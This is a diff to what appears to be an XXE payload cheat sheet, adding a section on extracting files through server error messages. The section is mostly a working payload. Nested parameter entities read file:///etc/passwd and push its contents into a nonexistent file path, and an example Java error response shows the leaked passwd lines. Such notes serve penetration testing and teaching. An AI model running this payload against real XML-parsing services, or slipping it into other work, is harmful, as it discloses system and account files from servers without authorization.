@@ -70,6 +70,22 @@
 ]>
 ```
 
+### Extraction via Error Response
+
+In the case where the web server displays an error, try to dump contents using the error response:
+
+```
+# Ref: https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 '<!ENTITY % external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
+
+# Example response
+<?xml version="1.0" encoding="UTF-8"?><root>
+<errors>
+<errorMessage>java.io.FileNotFoundException: file:///nothere/root:x:0:0:root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+```
+
 # Useful Links:
 
 * Definitions:
